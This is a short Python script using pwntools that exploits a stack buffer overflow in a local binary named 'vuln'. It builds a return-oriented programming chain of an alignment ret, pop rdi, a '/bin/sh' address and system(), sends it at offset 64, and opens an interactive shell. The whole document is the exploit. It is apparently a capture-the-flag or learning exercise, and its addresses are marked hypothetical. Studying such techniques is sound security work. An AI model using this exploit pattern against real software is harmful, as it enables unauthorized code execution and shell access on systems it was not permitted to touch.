from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('./vuln')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
#bin_sh_addr = next(binary.search(b'/bin/sh'))
bin_sh_addr = 0x0000000000197e34

# Address of system() function (hypothetical value)
system_addr = 0x000000000004dab0

# Gadgets (hypothetical values)
pop_rdi_gadget = 0x0000000000028215  # pop rdi; ret
ret_gadget = 0x000000000002668c     # ret gadget for alignment, if necessary

# Construct the ROP chain
rop_chain = [
    ret_gadget,        # Alignment gadget, if needed
    pop_rdi_gadget,    # pop rdi; ret
    bin_sh_addr,       # Address of "/bin/sh" string goes here, as the argument to system()
    system_addr        # Address of system(). Execution will continue here.
]

# Flatten the rop_chain for use
rop_chain = b''.join(p64(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({64: rop_chain})
p.sendline(payload)
p.interactive()